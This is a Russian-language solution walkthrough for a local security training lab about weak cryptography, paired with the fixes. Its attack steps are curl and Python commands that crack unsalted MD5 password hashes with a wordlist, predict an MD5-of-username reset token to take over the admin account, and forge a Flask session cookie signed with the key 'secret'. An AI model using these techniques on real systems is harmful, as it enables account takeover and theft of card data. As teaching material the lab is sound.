🌐 [English](./SOLUTION.md) · **Русский** · [Oʻzbekcha](./SOLUTION.uz.md)

# A04 — Решение (спойлеры!)

Сначала попробуйте пройти лабу сами, используя подсказки из [README](./README.ru.md).

## 1. Как хранятся данные (vulnerable, порт 8031)

```bash
curl -s http://127.0.0.1:8031/_lab/dump > dump.json
```

- `password_hash`: 32 hex-символа, то есть **MD5 без соли**
- `cards.number`: полные номера карт **открытым текстом**

## 2. Подбор паролей по словарю

MD5 считается мгновенно, а без соли одинаковые пароли дают одинаковые хеши, поэтому их можно сравнивать со словарём (запускать из папки лабы):

```bash
python3 - <<'EOF'
import hashlib, json
dump = json.load(open("dump.json"))
words = [w.strip() for w in open("wordlist.txt") if w.strip()]
for user in dump["users"]:
    for word in words:
        if hashlib.md5(word.encode()).hexdigest() == user["password_hash"]:
            print(user["username"], "->", word)
EOF
# alice -> sunshine
# bob   -> qwerty
```

Пароль `admin` в словаре отсутствует, поэтому так его не подобрать. Но есть другие пути.

## 3. Админ через предсказуемый токен сброса

```bash
# Запрашиваем сброс для себя и смотрим «письмо»
curl -H 'Content-Type: application/json' -d '{"username":"alice"}' http://127.0.0.1:8031/reset-request
curl http://127.0.0.1:8031/_lab/outbox
# ссылка вида /reset/<32 hex-символа>

# Сравниваем токен с MD5 от имени
echo -n alice | md5sum        # совпадает с токеном

# Значит, токен админа вычисляется так же
TOKEN=$(echo -n admin | md5sum | cut -d' ' -f1)
curl -H 'Content-Type: application/json' -d '{"new_password":"hacked123"}' http://127.0.0.1:8031/reset/$TOKEN

# Входим админом и смотрим флаг
curl -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"hacked123"}' http://127.0.0.1:8031/login
curl -b jar.txt http://127.0.0.1:8031/me     # FLAG{a04_admin_takeover}
```

## 4. Админ через подделку cookie

Ключ подписи сессии в коде равен `secret`, а такие слабые ключи подбираются по словарю. Зная ключ, можно подписать любую сессию:

```bash
pip install Flask
python3 - <<'EOF'
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
app = Flask("x")
app.secret_key = "secret"
print(SecureCookieSessionInterface().get_signing_serializer(app).dumps({"user": "admin"}))
EOF

curl --cookie "session=<значение из вывода>" http://127.0.0.1:8031/me   # FLAG{a04_admin_takeover}
```

## 5. Номера карт

`GET /cards` для вошедшего пользователя возвращает полный номер карты, а в «утёкшей» базе он лежит открытым текстом.

## Исправления (fixed, порт 8032)

| Проблема | Исправление |
|----------|-------------|
| MD5 без соли | `generate_password_hash` (scrypt с уникальной солью) |
| Токен = MD5(имя) | `secrets.token_urlsafe(32)`, в базе только SHA-256 от токена, срок жизни 15 минут, одноразовый |
| Ключ сессии `secret` | Ключ из `SECRET_KEY` или случайный (`secrets.token_hex(32)`), cookie с `HttpOnly` и `SameSite` |
| Карты открытым текстом | Шифрование Fernet (AES) перед записью, ключ из `DATA_ENCRYPTION_KEY`; в ответе только маска `**** **** **** 1111` |
| Слабые пароли при регистрации | Минимальная длина 8 символов |

Проверка на fixed:

```bash
curl -s http://127.0.0.1:8032/_lab/dump      # хеши scrypt:..., карты в виде gAAAA...
# предсказанный токен админа отвергается
curl -H 'Content-Type: application/json' -d '{"new_password":"hacked12345"}' \
  http://127.0.0.1:8032/reset/$(echo -n admin | md5sum | cut -d' ' -f1)      # 400
```

Подделанная cookie с ключом `secret` не принимается: подпись не совпадает.

## Что ещё стоит помнить
- Шифрование без защиты ключа бессмысленно: ключ нужно хранить отдельно от данных (менеджер секретов, переменные окружения).
- В лабе ключи при отсутствии переменных окружения создаются заново при каждом запуске. Для реальной системы это неприемлемо: после перезапуска старые данные нельзя было бы расшифровать.
- В `/_lab/dump` и `/_lab/outbox` нет защиты: это учебная имитация. В реальных приложениях таких эндпоинтов быть не должно.
